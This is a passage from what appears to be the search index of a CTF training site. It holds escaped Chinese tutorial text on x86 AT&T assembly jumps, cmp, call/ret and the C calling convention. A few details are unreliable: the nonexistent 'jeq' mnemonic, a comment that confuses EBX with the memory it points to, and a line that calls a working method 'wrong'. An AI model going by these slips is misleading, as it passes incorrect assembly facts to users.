&lt;label\n</code></pre> <ul> <li>\u4f8b\u5b50</li> </ul> <pre><code>jmp begin ;\u8df3\u8f6c\u5230\u6253\u4e86 \" begin \" \u8fd9\u4e2a\u6807\u7b7e\u7684\u5730\u65b9\n</code></pre> <p></p> <ul> <li><code>jcondition</code> \u6709\u6761\u4ef6\u7684\u8df3\u8f6c</li> </ul> <p>\u8fd9\u4e9b\u6307\u4ee4\u662f\u6761\u4ef6\u8df3\u8f6c\u6307\u4ee4, \u5b83\u4eec\u57fa\u4e8e\u4e00\u7ec4\u6761\u4ef6\u4ee3\u7801\u7684\u72b6\u6001, \u8fd9\u4e9b\u6761\u4ef6\u4ee3\u7801\u7684\u72b6\u6001\u5b58\u653e\u5728\u79f0\u4e3a\u673a\u5668\u72b6\u6001\u5b57 ( machine status word ) \u7684\u7279\u6b8a\u5bc4\u5b58\u5668\u4e2d. \u673a\u5668\u72b6\u6001\u5b57\u7684\u5185\u5bb9\u5305\u62ec\u5173\u4e8e\u6700\u540e\u6267\u884c\u7684\u7b97\u672f\u8fd0\u7b97\u7684\u4fe1\u606f. \u4f8b\u5982, \u8fd9\u4e2a\u5b57\u7684\u4e00\u4e2a\u4f4d\u8868\u793a\u6700\u540e\u7684\u7ed3\u679c\u662f\u5426\u4e3a 0. \u53e6\u4e00\u4e2a\u4f4d\u8868\u793a\u6700\u540e\u7ed3\u679c\u662f\u5426\u4e3a\u8d1f\u6570. \u57fa\u4e8e\u8fd9\u4e9b\u6761\u4ef6\u4ee3\u7801, \u53ef\u4ee5\u6267\u884c\u8bb8\u591a\u6761\u4ef6\u8df3\u8f6c. \u4f8b\u5982, \u5982\u679c\u6700\u540e\u4e00\u6b21\u7b97\u672f\u8fd0\u7b97\u7ed3\u679c\u4e3a 0, \u5219 <code>jz</code> \u6307\u4ee4\u5c31\u662f\u8df3\u8f6c\u5230\u6307\u5b9a\u53c2\u6570\u6807\u7b7e. \u5426\u5219, \u7a0b\u5e8f\u5c31\u6309\u7167\u6d41\u7a0b\u8fdb\u5165\u4e0b\u4e00\u6761\u6307\u4ee4.</p> <p>\u8bb8\u591a\u6761\u4ef6\u5206\u652f\u7684\u540d\u79f0\u90fd\u662f\u5f88\u76f4\u89c2\u7684, \u8fd9\u4e9b\u6307\u4ee4\u7684\u8fd0\u884c, \u90fd\u548c\u4e00\u4e2a\u7279\u6b8a\u7684\u6bd4\u8f83\u6307\u4ee4\u6709\u5173, <code>cmp</code>( \u89c1\u4e0b\u6587 ). \u4f8b\u5982, \u50cf <code>jle</code> \u548c <code>jne</code> \u8fd9\u79cd\u6307\u4ee4, \u5b83\u4eec\u9996\u5148\u5bf9\u53c2\u6570\u8fdb\u884c <code>cmp</code> \u64cd\u4f5c.</p> <ul> <li>\u8bed\u6cd5</li> </ul> <pre><code>je &lt;label ;\u5f53\u76f8\u7b49\u7684\u65f6\u5019\u8df3\u8f6c\njne &lt;label ;\u5f53\u4e0d\u76f8\u7b49\u7684\u65f6\u5019\u8df3\u8f6c\njz &lt;label ;\u5f53\u6700\u540e\u7ed3\u679c\u4e3a 0 \u7684\u65f6\u5019\u8df3\u8f6c\njg &lt;label ;\u5f53\u5927\u4e8e\u7684\u65f6\u5019\u8df3\u8f6c\njge &lt;label ;\u5f53\u5927\u4e8e\u7b49\u4e8e\u7684\u65f6\u5019\u8df3\u8f6c\njl &lt;label ;\u5f53\u5c0f\u4e8e\u7684\u65f6\u5019\u8df3\u8f6c\njle &lt;label ;\u5f53\u5c0f\u4e8e\u7b49\u4e8e\u7684\u65f6\u5019\u8df3\u8f6c\n</code></pre> <ul> <li>\u4f8b\u5b50</li> </ul> <pre><code>cmp %ebx, %eax\njle done\n;\u5982\u679c EAX \u7684\u503c\u5c0f\u4e8e\u7b49\u4e8e EBX \u7684\u503c, \u5c31\u8df3\u8f6c\u5230 \" done \" \u6807\u7b7e, \u5426\u5219\u5c31\u7ee7\u7eed\u6267\u884c\u4e0b\u4e00\u6761\u6307\u4ee4.\n</code></pre> <p></p> <ul> <li><code>cmp</code> \u6bd4\u8f83\u6307\u4ee4</li> </ul> <p>\u6bd4\u8f83\u4e24\u4e2a\u53c2\u6570\u7684\u503c, \u9002\u5f53\u5730\u8bbe\u7f6e\u673a\u5668\u72b6\u6001\u5b57\u4e2d\u7684\u6761\u4ef6\u4ee3\u7801. \u6b64\u6307\u4ee4\u4e0esub\u6307\u4ee4\u7c7b\u4f3c\uff0c\u4f46\u662fcmp\u4e0d\u7528\u5c06\u8ba1\u7b97\u7ed3\u679c\u4fdd\u5b58\u5728\u64cd\u4f5c\u6570\u4e2d.</p> <ul> <li>\u8bed\u6cd5</li> </ul> <pre><code>cmp &lt;reg, &lt;reg\ncmp &lt;mem, &lt;reg\ncmp &lt;reg, &lt;mem\ncmp &lt;con, &lt;reg\n</code></pre> <ul> <li>\u4f8b\u5b50</li> </ul> <pre><code>cmpb $10, (%ebx)\njeq loop\n;\u5982\u679c EBX \u7684\u503c\u7b49\u4e8e\u6574\u6570\u5e38\u91cf 10, \u5219\u8df3\u8f6c\u5230\u6807\u7b7e \" loop \" \u7684\u4f4d\u7f6e.\n</code></pre> <p></p> <ul> <li><code>call, ret</code> \u5b50\u7a0b\u5e8f\u8c03\u7528\u4e0e\u8fd4\u56de</li> </ul> <p>\u8fd9\u4e24\u4e2a\u6307\u4ee4\u5b9e\u73b0\u5b50\u7a0b\u5e8f\u7684\u8c03\u7528\u548c\u8fd4\u56de. <code>call</code> \u6307\u4ee4\u9996\u5148\u5c06\u5f53\u524d\u4ee3\u7801\u4f4d\u7f6e\u63a8\u5230\u5185\u5b58\u4e2d\u786c\u4ef6\u652f\u6301\u7684\u6808\u5185\u5b58\u4e0a ( \u8bf7\u770b <code>push</code> \u6307\u4ee4 ), \u7136\u540e\u65e0\u6761\u4ef6\u8df3\u8f6c\u5230\u6807\u7b7e\u53c2\u6570\u6307\u5b9a\u7684\u4ee3\u7801\u4f4d\u7f6e. \u4e0e\u7b80\u5355\u7684 <code>jmp</code> \u6307\u4ee4\u4e0d\u540c, <code>call</code> \u6307\u4ee4\u4fdd\u5b58\u4e86\u5b50\u7a0b\u5e8f\u5b8c\u6210\u65f6\u8fd4\u56de\u7684\u4f4d\u7f6e. \u5c31\u662f <code>call</code> \u6307\u4ee4\u7ed3\u675f\u540e, \u8fd4\u56de\u5230\u8c03\u7528\u4e4b\u524d\u7684\u5730\u5740.</p> <p><code>ret</code> \u6307\u4ee4\u5b9e\u73b0\u5b50\u7a0b\u5e8f\u7684\u8fd4\u56de. \u8be5\u6307\u4ee4\u9996\u5148\u4ece\u6808\u4e2d\u53d6\u51fa\u4ee3\u7801 ( \u7c7b\u4f3c\u4e8e <code>pop</code> \u6307\u4ee4 ). \u7136\u540e\u5b83\u65e0\u6761\u4ef6\u8df3\u8f6c\u5230\u68c0\u7d22\u5230\u7684\u4ee3\u7801\u4f4d\u7f6e.</p> <ul> <li>\u8bed\u6cd5</li> </ul> <pre><code>call &lt;label\nret\n</code></pre>"},{"location":"Training/Material/Reverse/#335-calling-convention","title":"3.3.5 \u8c03\u7528\u7ea6\u5b9a Calling Convention","text":"<p>\u4e3a\u4e86\u65b9\u4fbf\u4e0d\u540c\u7684\u7a0b\u5e8f\u5458\u53bb\u5206\u4eab\u4ee3\u7801\u548c\u8fd0\u884c\u5e93, \u5e76\u7b80\u5316\u4e00\u822c\u5b50\u7a0b\u5e8f\u7684\u4f7f\u7528, \u7a0b\u5e8f\u5458\u4eec\u901a\u5e38\u4f1a\u9075\u5b88\u4e00\u5b9a\u7684\u7ea6\u5b9a ( Calling Convention ). \u8c03\u7528\u7ea6\u5b9a\u662f\u5173\u4e8e\u5982\u4f55\u4ece\u4f8b\u7a0b\u8c03\u7528\u548c\u8fd4\u56de\u7684\u534f\u8bae. \u4f8b\u5982\uff0c\u7ed9\u5b9a\u4e00\u7ec4\u8c03\u7528\u7ea6\u5b9a\u89c4\u5219\uff0c\u7a0b\u5e8f\u5458\u4e0d\u9700\u8981\u68c0\u67e5\u5b50\u4f8b\u7a0b\u7684\u5b9a\u4e49\u6765\u786e\u5b9a\u5982\u4f55\u5c06\u53c2\u6570\u4f20\u9012\u7ed9\u8be5\u5b50\u4f8b\u7a0b. \u6b64\u5916\uff0c\u7ed9\u5b9a\u4e00\u7ec4\u8c03\u7528\u7ea6\u5b9a\u89c4\u5219\uff0c\u53ef\u4ee5\u4f7f\u9ad8\u7ea7\u8bed\u8a00\u7f16\u8bd1\u5668\u9075\u5faa\u89c4\u5219\uff0c\u4ece\u800c\u5141\u8bb8\u624b\u52a8\u7f16\u7801\u7684\u6c47\u7f16\u8bed\u8a00\u4f8b\u7a0b\u548c\u9ad8\u7ea7\u8bed\u8a00\u4f8b\u7a0b\u76f8\u4e92\u8c03\u7528.</p> <p>\u6211\u4eec\u5c06\u8bb2\u89e3\u88ab\u5e7f\u6cdb\u4f7f\u7528\u7684 C \u8bed\u8a00\u8c03\u7528\u7ea6\u5b9a. \u9075\u5faa\u6b64\u7ea6\u5b9a\u5c06\u5141\u8bb8\u60a8\u7f16\u5199\u53ef\u4ece C ( \u548cC ++ ) \u4ee3\u7801\u5b89\u5168\u5730\u8c03\u7528\u7684\u6c47\u7f16\u8bed\u8a00\u5b50\u4f8b\u7a0b, \u5e76\u4e14\u8fd8\u5141\u8bb8\u60a8\u4ece\u6c47\u7f16\u8bed\u8a00\u4ee3\u7801\u8c03\u7528 C \u51fd\u6570\u5e93.</p> <p>C \u8c03\u7528\u7ea6\u5b9a\u5f88\u5927\u7a0b\u5ea6\u4e0a\u53d6\u51b3\u4e8e\u4f7f\u7528\u786c\u4ef6\u652f\u6301\u7684\u6808\u5185\u5b58. \u5b83\u57fa\u4e8e <code>push</code>, <code>pop</code>, <code>call</code> \u548c <code>ret</code> \u6307\u4ee4. \u5b50\u7a0b\u5e8f\u7684\u53c2\u6570\u5728\u6808\u4e0a\u4f20\u9012. \u5bc4\u5b58\u5668\u4fdd\u5b58\u5728\u6808\u4e2d, \u5b50\u7a0b\u5e8f\u4f7f\u7528\u7684\u5c40\u90e8\u53d8\u91cf\u653e\u5728\u6808\u4e2d. \u5728\u5927\u591a\u6570\u5904\u7406\u5668\u4e0a\u5b9e\u73b0\u7684\u9ad8\u7ea7\u8fc7\u7a0b\u8bed\u8a00\u90fd\u4f7f\u7528\u4e86\u7c7b\u4f3c\u7684\u8c03\u7528\u7ea6\u5b9a.</p> <p>\u8c03\u7528\u7ea6\u5b9a\u5206\u4e3a\u4e24\u7ec4. \u7b2c\u4e00\u7ec4\u89c4\u5219\u662f\u9762\u5411\u5b50\u4f8b\u7a0b\u7684\u8c03\u7528\u8005 ( Caller ) \u7684, \u7b2c\u4e8c\u7ec4\u89c4\u5219\u9762\u5411\u5b50\u4f8b\u7a0b\u7684\u7f16\u5199\u8005, \u5373\u88ab\u8c03\u7528\u8005 ( Callee ). \u5e94\u8be5\u5f3a\u8c03\u7684\u662f, \u9519\u8bef\u5730\u9075\u5b88\u8fd9\u4e9b\u89c4\u5219\u4f1a\u5bfc\u81f4\u7a0b\u5e8f\u7684\u81f4\u547d\u9519\u8bef, \u56e0\u4e3a\u6808\u5c06\u5904\u4e8e\u4e0d\u4e00\u81f4\u7684\u72b6\u6001; \u56e0\u6b64, \u5728\u4f60\u81ea\u5df1\u7684\u5b50\u4f8b\u7a0b\u4e2d\u5b9e\u73b0\u8c03\u7528\u7ea6\u5b9a\u7684\u65f6\u5019, \u52a1\u5fc5\u5f53\u5fc3.</p> <p></p> <p>\u5c06\u8c03\u7528\u7ea6\u5b9a\u53ef\u89c6\u5316\u7684\u4e00\u79cd\u597d\u65b9\u6cd5\u662f, \u5728\u5b50\u4f8b\u7a0b\u6267\u884c\u671f\u95f4\u753b\u4e00\u4e2a\u6808\u5185\u5b58\u9644\u8fd1\u7684\u56fe. \u56fe 2 \u63cf\u7ed8\u4e86\u5728\u6267\u884c\u5177\u6709\u4e09\u4e2a\u53c2\u6570\u548c\u4e09\u4e2a\u5c40\u90e8\u53d8\u91cf\u7684\u5b50\u7a0b\u5e8f\u671f\u95f4\u6808\u7684\u5185\u5bb9. \u6808\u4e2d\u63cf\u7ed8\u7684\u5355\u5143\u90fd\u662f 32 \u4f4d\u5185\u5b58\u5355\u5143, \u56e0\u6b64\u8fd9\u4e9b\u5355\u5143\u7684\u5185\u5b58\u5730\u5740\u76f8\u9694 4 \u4e2a\u5b57\u8282. \u7b2c\u4e00\u4e2a\u53c2\u6570\u4f4d\u4e8e\u8ddd\u57fa\u6307\u9488 8 \u4e2a\u5b57\u8282\u7684\u504f\u79fb\u5904. \u5728\u6808\u53c2\u6570\u7684\u4e0a\u65b9 ( \u548c\u57fa\u6307\u9488\u4e0b\u65b9 ), <code>call</code> \u6307\u4ee4\u5728\u8fd9\u653e\u4e86\u8fd4\u56de\u5730\u5740, \u4ece\u800c\u5bfc\u81f4\u4ece\u57fa\u6307\u9488\u5230\u7b2c\u4e00\u4e2a\u53c2\u6570\u6709\u989d\u5916 4 \u4e2a\u5b57\u8282\u7684\u504f\u79fb\u91cf. \u5f53 <code>ret</code> \u6307\u4ee4\u7528\u4e8e\u4ece\u5b50\u7a0b\u5e8f\u8fd4\u56de\u65f6, \u5b83\u5c06\u8df3\u8f6c\u5230\u6808\u4e2d\u7684\u8fd4\u56de\u5730\u5740.</p>"},{"location":"Training/Material/Reverse/#3351-caller-rules","title":"3.3.5.1 \u8c03\u7528\u8005\u7ea6\u5b9a Caller Rules","text":"<p>\u8981\u8fdb\u884c\u5b50\u7a0b\u5e8f\u8c03\u7528, \u8c03\u7528\u8005\u5e94\u8be5 :</p> <ol> <li>\u5728\u8c03\u7528\u5b50\u4f8b\u7a0b\u4e4b\u524d, \u8c03\u7528\u8005\u5e94\u8be5\u4fdd\u5b58\u6307\u5b9a\u8c03\u7528\u8005\u4fdd\u5b58 ( Caller-saved )\u7684\u67d0\u4e9b\u5bc4\u5b58\u5668\u7684\u5185\u5bb9. \u8c03\u7528\u8005\u4fdd\u5b58\u7684\u5bc4\u5b58\u5668\u662f EAX, ECX, EDX. \u7531\u4e8e\u88ab\u8c03\u7528\u7684\u5b50\u7a0b\u5e8f\u53ef\u4ee5\u4fee\u6539\u8fd9\u4e9b\u5bc4\u5b58\u5668, \u6240\u4ee5\u5982\u679c\u8c03\u7528\u8005\u5728\u5b50\u4f8b\u7a0b\u8fd4\u56de\u540e\u4f9d\u8d56\u8fd9\u4e9b\u5bc4\u5b58\u5668\u7684\u503c, \u8c03\u7528\u8005\u5fc5\u987b\u5c06\u8fd9\u4e9b\u5bc4\u5b58\u5668\u7684\u503c\u5165\u6808, \u7136\u540e\u5c31\u53ef\u4ee5\u5728\u5b50\u4f8b\u7a0b\u8fd4\u56de\u540e\u6062\u590d\u5b83\u4eec.</li> <li>\u8981\u628a\u53c2\u6570\u4f20\u9012\u7ed9\u5b50\u4f8b\u7a0b, \u4f60\u53ef\u4ee5\u5728\u8c03\u7528\u4e4b\u524d\u628a\u53c2\u6570\u5165\u6808. \u53c2\u6570\u7684\u5165\u6808\u987a\u5e8f\u5e94\u8be5\u662f\u53cd\u7740\u7684, \u5c31\u662f\u6700\u540e\u4e00\u4e2a\u53c2\u6570\u5e94\u8be5\u6700\u5148\u5165\u6808. \u968f\u7740\u6808\u5185\u5b58\u5730\u5740\u589e\u5927, \u7b2c\u4e00\u4e2a\u53c2\u6570\u5c06\u5b58\u50a8\u5728\u6700\u4f4e\u7684\u5730\u5740, \u5728\u5386\u53f2\u4e0a, \u8fd9\u79cd\u53c2\u6570\u7684\u53cd\u8f6c\u7528\u4e8e\u5141\u8bb8\u51fd\u6570\u4f20\u9012\u53ef\u53d8\u6570\u91cf\u7684\u53c2\u6570.</li> <li>\u8981\u8c03\u7528\u5b50\u4f8b\u7a0b, \u8bf7\u4f7f\u7528<code>call</code>\u6307\u4ee4. \u8be5\u6307\u4ee4\u5c06\u8fd4\u56de\u5730\u5740\u5b58\u5230\u6808\u4e0a, \u5e76\u8df3\u8f6c\u5230\u5b50\u7a0b\u5e8f\u7684\u4ee3\u7801. \u8fd9\u4e2a\u4f1a\u8c03\u7528\u5b50\u7a0b\u5e8f, \u8fd9\u4e2a\u5b50\u7a0b\u5e8f\u5e94\u8be5\u9075\u5faa\u4e0b\u9762\u7684\u88ab\u8c03\u7528\u8005\u7ea6\u5b9a.</li> </ol> <p>\u5b50\u7a0b\u5e8f\u8fd4\u56de\u540e ( \u7d27\u8ddf\u8c03\u7528\u6307\u4ee4\u540e ), \u8c03\u7528\u8005\u53ef\u4ee5\u671f\u671b\u5728\u5bc4\u5b58\u5668 EAX \u4e2d\u627e\u5230\u5b50\u4f8b\u7a0b\u7684\u8fd4\u56de\u503c. \u8981\u6062\u590d\u673a\u5668\u72b6\u6001 ( machine state ), \u8c03\u7528\u8005\u5e94\u8be5 :</p> <ol> <li>\u4ece\u6808\u4e2d\u5220\u9664\u53c2\u6570, \u8fd9\u4f1a\u628a\u6808\u6062\u590d\u5230\u8c03\u7528\u4e4b\u524d\u7684\u72b6\u6001.</li> <li>\u628a EAX, ECX, EDX \u4e4b\u524d\u5165\u6808\u7684\u5185\u5bb9\u7ed9\u51fa\u6808, \u8c03\u7528\u8005\u53ef\u4ee5\u5047\u8bbe\u5b50\u4f8b\u7a0b\u6ca1\u6709\u4fee\u6539\u5176\u5b83\u5bc4\u5b58\u5668.</li> <li>\u4f8b\u5b50</li> </ol> <p>\u4e0b\u9762\u7684\u4ee3\u7801\u5c31\u662f\u4e2a\u6d3b\u751f\u751f\u7684\u4f8b\u5b50, \u5b83\u5c55\u793a\u4e86\u9075\u5faa\u7ea6\u5b9a\u7684\u51fd\u6570\u8c03\u7528. \u8c03\u7528\u8005\u6b63\u5728\u8c03\u7528\u4e00\u4e2a\u5e26\u6709 3 \u4e2a\u6574\u6570\u53c2\u6570\u7684\u51fd\u6570 myFunc. \u7b2c\u4e00\u4e2a\u53c2\u6570\u662f EAX, \u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u5e38\u6570 216; \u7b2c\u4e09\u4e2a\u53c2\u6570\u4f4d\u4e8e EBX \u7684\u503c\u6240\u4ee3\u8868\u7684\u5185\u5b58\u5730\u5740.</p> <pre><code>push (%ebx) ;\u6700\u540e\u4e00\u4e2a\u53c2\u6570\u6700\u5148\u5165\u6808\npush $216 ;\u628a\u7b2c\u4e8c\u4e2a\u53c2\u6570\u5165\u6808\npush %eax ;\u7b2c\u4e00\u4e2a\u53c2\u6570\u6700\u540e\u5165\u6808\n\ncall myFunc ;\u8c03\u7528\u8fd9\u4e2a\u51fd\u6570 ( \u5047\u8bbe\u4ee5 C \u8bed\u8a00\u7684\u6a21\u5f0f\u547d\u540d )\n\nadd $12, %esp\n</code></pre> <p>\u6ce8\u610f, \u5728\u8c03\u7528\u8fd4\u56de\u540e, \u8c03\u7528\u8005\u4f7f\u7528 <code>add</code> \u6307\u4ee4\u6765\u6e05\u7406\u6808\u5185\u5b58. \u6211\u4eec\u6808\u5185\u5b58\u4e2d\u6709 12 \u4e2a\u5b57\u8282 ( 3 \u4e2a\u53c2\u6570, \u6bcf\u4e2a\u53c2\u6570 4 \u4e2a\u5b57\u8282 ), \u7136\u540e\u6808\u5185\u5b58\u5730\u5740\u589e\u5927. \u56e0\u6b64, \u4e3a\u4e86\u6446\u8131\u6389\u8fd9\u4e9b\u53c2\u6570, \u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u5f80\u6808\u91cc\u9762\u52a0\u4e2a 12.</p> <p>myFunc \u751f\u6210\u7684\u7ed3\u679c\u73b0\u5728\u53ef\u4ee5\u6709\u7528\u4e8e\u5bc4\u5b58\u5668 EAX. \u8c03\u7528\u8005\u4fdd\u5b58 ( Caller-saved ) \u7684\u5bc4\u5b58\u5668 ( ECX, EDX ) \u7684\u503c\u53ef\u80fd\u5df2\u7ecf\u88ab\u4fee\u6539. \u5982\u679c\u8c03\u7528\u8005\u5728\u8c03\u7528\u4e4b\u540e\u4f7f\u7528\u5b83\u4eec\uff0c\u5219\u9700\u8981\u5728\u8c03\u7528\u4e4b\u524d\u5c06\u5b83\u4eec\u4fdd\u5b58\u5728\u5806\u6808\u4e2d\u5e76\u5728\u8c03\u7528\u4e4b\u540e\u6062\u590d\u5b83\u4eec. \u8bf4\u767d\u4e86\u5c31\u662f\u628a\u6808\u8fd9\u4e2a\u73a9\u610f\u5f53\u4f5c\u4e34\u65f6\u5b58\u653e\u70b9.</p>"},{"location":"Training/Material/Reverse/#3352-callee-rules","title":"3.3.5.2 \u88ab\u8c03\u7528\u8005\u7ea6\u5b9a Callee Rules","text":"<p>\u5b50\u4f8b\u7a0b\u7684\u5b9a\u4e49\u5e94\u8be5\u9075\u5faa\u5b50\u4f8b\u7a0b\u5f00\u5934\u7684\u4ee5\u4e0b\u89c4\u5219 :</p> <ul> <li>1.\u5c06 EBP \u7684\u503c\u5165\u6808, \u7136\u540e\u7528\u4e0b\u9762\u7684\u6307\u793a\u4fe1\u606f\u628a ESP \u7684\u503c\u590d\u5236\u5230 EBP \u4e2d :</li> </ul> <pre><code> push %ebp\n mov  %esp, %ebp\n</code></pre> <p>\u8fd9\u4e2a\u521d\u59cb\u64cd\u4f5c\u4fdd\u7559\u4e86\u57fa\u6307\u9488 EBP. \u6309\u7167\u7ea6\u5b9a, \u57fa\u6307\u9488\u4f5c\u4e3a\u6808\u4e0a\u627e\u5230\u53c2\u6570\u548c\u53d8\u91cf\u7684\u53c2\u8003\u70b9. \u5f53\u5b50\u7a0b\u5e8f\u6b63\u5728\u6267\u884c\u7684\u65f6\u5019, \u57fa\u6307\u9488\u4fdd\u5b58\u4e86\u4ece\u5b50\u7a0b\u5e8f\u5f00\u59cb\u6267\u884c\u662f\u7684\u6808\u6307\u9488\u503c\u7684\u526f\u672c. \u53c2\u6570\u548c\u5c40\u90e8\u53d8\u91cf\u5c06\u59cb\u7ec8\u4f4d\u4e8e\u8fdc\u79bb\u57fa\u6307\u9488\u503c\u7684\u5df2\u77e5\u5e38\u91cf\u504f\u79fb\u5904. \u6211\u4eec\u5728\u5b50\u4f8b\u7a0b\u7684\u5f00\u5934\u63a8\u9001\u65e7\u7684\u57fa\u6307\u9488\u503c\uff0c\u4ee5\u4fbf\u7a0d\u540e\u5728\u5b50\u4f8b\u7a0b\u8fd4\u56de\u65f6\u4e3a\u8c03\u7528\u8005\u6062\u590d\u9002\u5f53\u7684\u57fa\u6307\u9488\u503c. \u8bb0\u4f4f, \u8c03\u7528\u8005\u4e0d\u5e0c\u671b\u5b50\u4f8b\u7a0b\u4fee\u6539\u57fa\u6307\u9488\u7684\u503c. \u7136\u540e\u6211\u4eec\u628a\u6808\u6307\u9488\u79fb\u52a8\u5230 EBP \u4e2d, \u4ee5\u83b7\u53d6\u8bbf\u95ee\u53c2\u6570\u548c\u5c40\u90e8\u53d8\u91cf\u7684\u53c2\u8003\u70b9.</p> <ul> <li>2.\u63a5\u4e0b\u6765, \u901a\u8fc7\u5728\u6808\u4e2d\u521b\u5efa\u7a7a\u95f4\u6765\u5206\u914d\u5c40\u90e8\u53d8\u91cf. \u56de\u60f3\u4e00\u4e0b, \u6808\u4f1a\u5411\u4e0b\u589e\u957f, \u56e0\u6b64\u8981\u5728\u6808\u9876\u90e8\u521b\u5efa\u7a7a\u95f4, \u6808\u6307\u9488\u5e94\u8be5\u9012\u51cf. \u6808\u6307\u9488\u9012\u51cf\u7684\u6570\u91cf\u53d6\u51b3\u4e8e\u6240\u9700\u5c40\u90e8\u53d8\u91cf\u7684\u6570\u91cf\u548c\u5927\u5c0f. \u4f8b\u5982, \u5982\u679c\u9700\u8981 3 \u4e2a\u5c40\u90e8\u6574\u6570 ( \u6bcf\u4e2a 4 \u5b57\u8282 ), \u5219\u9700\u8981\u5c06\u5806\u6808\u6307\u9488\u9012\u51cf 12, \u4ece\u800c\u4e3a\u8fd9\u4e9b\u5c40\u90e8\u53d8\u91cf\u817e\u51fa\u7a7a\u95f4 ( \u5373sub $12, %esp ). \u548c\u53c2\u6570\u4e00\u6837, \u5c40\u90e8\u53d8\u91cf\u5c06\u4f4d\u4e8e\u57fa\u6307\u9488\u7684\u5df2\u77e5\u504f\u79fb\u5904.</li> <li>3.\u63a5\u4e0b\u6765, \u4fdd\u5b58\u5c06\u7531\u51fd\u6570\u4f7f\u7528\u7684 \u88ab\u8c03\u7528\u8005\u4fdd\u5b58\u7684 ( Callee-saved ) \u5bc4\u5b58\u5668\u7684\u503c. \u8981\u5b58\u50a8\u5bc4\u5b58\u5668, \u8bf7\u628a\u5b83\u4eec\u5165\u6808. \u88ab\u8c03\u7528\u8005\u4fdd\u5b58 ( Callee-saved ) \u7684\u5bc4\u5b58\u5668\u662f EBX, EDI \u548c ESI ( ESP \u548c EBP \u4e5f\u5c06\u7531\u8c03\u7528\u7ea6\u5b9a\u4fdd\u7559, \u4f46\u5728\u8fd9\u4e2a\u6b65\u9aa4\u4e2d\u4e0d\u9700\u8981\u5165\u6808 ).</li> </ul> <p>\u5728\u5b8c\u6210\u8fd9 3 \u6b65\u4e4b\u540e, \u5b50\u4f8b\u7a0b\u7684\u4e3b\u4f53\u53ef\u4ee5\u7ee7\u7eed. \u8fd4\u56de\u5b50\u4f8b\u7a0b\u7684\u65f6\u5019, \u5fc5\u987b\u9075\u5faa\u4ee5\u4e0b\u6b65\u9aa4 :</p> <ol> <li>\u5c06\u8fd4\u56de\u503c\u4fdd\u5b58\u5728 EAX \u4e2d.</li> <li>\u6062\u590d\u5df2\u7ecf\u88ab\u4fee\u6539\u7684\u4efb\u4f55\u88ab\u8c03\u7528\u8005\u4fdd\u5b58 ( Callee-saved ) \u7684\u5bc4\u5b58\u5668 ( EDI \u548c ESI ) \u7684\u65e7\u503c. \u901a\u8fc7\u51fa\u6808\u6765\u6062\u590d\u5b83\u4eec. \u5f53\u7136\u5e94\u8be5\u6309\u7167\u76f8\u53cd\u7684\u987a\u5e8f\u628a\u5b83\u4eec\u51fa\u6808.</li> <li>\u91ca\u653e\u5c40\u90e8\u53d8\u91cf. \u663e\u800c\u6613\u89c1\u7684\u6cd5\u5b50\u662f\u628a\u76f8\u5e94\u7684\u503c\u6dfb\u52a0\u5230\u6808\u6307\u9488 ( \u56e0\u4e3a\u7a7a\u95f4\u662f\u901a\u8fc7\u6808\u6307\u9488\u51cf\u53bb\u6240\u9700\u7684\u6570\u91cf\u6765\u5206\u914d\u7684 ). \u4e8b\u5b9e\u4e0a\u5462, \u89e3\u9664\u53d8\u91cf\u91ca\u653e\u7684\u9519\u8bef\u7684\u65b9\u6cd5\u662f\u5c06\u57fa\u6307\u9488\u4e2d\u7684\u503c\u79fb\u52a8\u5230\u6808\u6307\u9488 : <code>mov %ebp, %esp</code>. \u8fd9\u4e2a\u6cd5\u5b50\u6709\u6548, \u662f\u56e0\u4e3a\u57fa\u6307\u9488\u59cb\u7ec8\u5305\u542b\u6808\u6307\u9488\u5728\u5206\u914d\u5c40\u90e8\u53d8\u91cf\u4e4b\u524d\u5305\u542b\u7684\u503c.</li> <li>\u5728\u8fd4\u56de\u4e4b\u524d, \u7acb\u5373\u901a\u8fc7\u628a EBP \u51fa\u6808\u6765\u6062\u590d\u8c03\u7528\u8005\u7684\u57fa\u6307\u9488\u503c. \u56de\u60f3\u4e00\u4e0b, \u6211\u4eec\u5728\u8fdb\u5165\u5b50\u7a0b\u5e8f\u7684\u65f6\u5019\u505a\u7684\u7b2c\u4e00\u4ef6\u4e8b\u662f\u63a8\u52a8\u57fa\u6307\u9488\u4fdd\u5b58\u5b83\u7684\u65e7\u503c.</li> <li>\u6700\u540e, \u901a\u8fc7\u6267\u884c <code>ret</code> \u6307\u4ee4\u8fd4\u56de. \u8fd9\u4e2a\u6307\u4ee4\u5c06\u4ece\u6808\u4e2d\u627e\u5230\u5e76\u5220\u9664\u76f8\u5e94\u7684\u8fd4\u56de\u5730\u5740 ( call \u6307\u4ee4\u4fdd\u5b58\u7684\u90a3\u4e2a ).</li> </ol> <p>\u8bf7\u6ce8\u610f, \u88ab\u8c03\u7528\u8005\u7684\u7ea6\u5b9a\u5b8c\u5168\u88ab\u5206\u6210\u4e86\u4e24\u534a, \u7b80\u76f4\u662f\u5f7c\u6b64\u7684\u955c\u50cf. \u7ea6\u5b9a\u7684\u524d\u534a\u90e8\u5206\u9002\u7528\u4e8e\u51fd\u6570\u5f00\u5934, \u5e76\u4e14\u901a\u5e38\u88ab\u79f0\u4e3a\u5b9a\u4e49\u51fd\u6570\u7684\u5e8f\u8a00 ( prologue ) .\u8fd9\u4e2a\u7ea6\u5b9a\u7684\u540e\u534a\u90e8\u5206\u9002\u7528\u4e8e\u51fd\u6570\u7ed3\u5c3e, \u56e0\u6b64\u901a\u5e38\u88ab\u79f0\u4e3a\u5b9a\u4e49\u51fd\u6570\u7684\u7ed3\u5c3e ( epilogue ).</p> <ul> <li>\u4f8b\u5b50</li> </ul> <p>\u8fd9\u662f\u4e00\u4e2a\u9075\u5faa\u88ab\u8c03\u7528\u8005\u7ea6\u5b9a\u7684\u4f8b\u5b50 :</p> <pre><code>;\u542f\u52a8\u4ee3\u7801\u90e8\u5206\n.text\n\n;\u5c06 myFunc \u5b9a\u4e49\u4e3a\u5168\u5c40 ( \u5bfc\u51fa ) \u51fd\u6570\n.globl myFunc\n.type myFunc, @function\nmyFunc :\n;\u5b50\u7a0b\u5e8f\u5e8f\u8a00\npush %ebp ;\u4fdd\u5b58\u57fa\u6307\u9488\u65e7\u503c\nmov %esp, %ebp ;\u8bbe\u7f6e\u57fa\u6307\u9488\u65b0\u503c\nsub $4, %esp ;\u4e3a\u4e00\u4e2a 4 